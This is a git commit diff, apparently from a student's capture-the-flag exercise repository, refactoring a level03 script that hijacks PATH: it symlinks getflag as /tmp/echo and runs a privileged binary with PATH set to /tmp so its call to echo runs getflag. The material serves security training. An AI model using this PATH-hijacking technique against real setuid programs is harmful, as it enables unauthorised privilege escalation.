f2566c2ab579bb9d83092cd23db581c2e8485dfa
jodufour <jodufour@student.42.fr>
2025-02-12 20:49:57 +0100

    refactor: improved `invoke_getflag_via_echo.sh` in level03
    No longer export the `PATH` to a new value. Run the `level03` file
    via the `env` command instead, setting the `PATH` to `/tmp`.

--- level03/resources/invoke_getflag_via_echo.sh
+++ level03/resources/invoke_getflag_via_echo.sh
@@ -3,10 +3,7 @@
 # Create a symbolic link named `echo` that points to the `getflag` command
 ln -s $(which getflag) /tmp/echo
 
-# Set the `/tmp` directory as the only one in the `PATH` environment variable
-export PATH=/tmp
-
-# Execute the `level03` file
-~/level03
+# Execute the `level03` file with an altered `PATH` environment variable
+env -i PATH=/tmp ~/level03
 
 exit 0
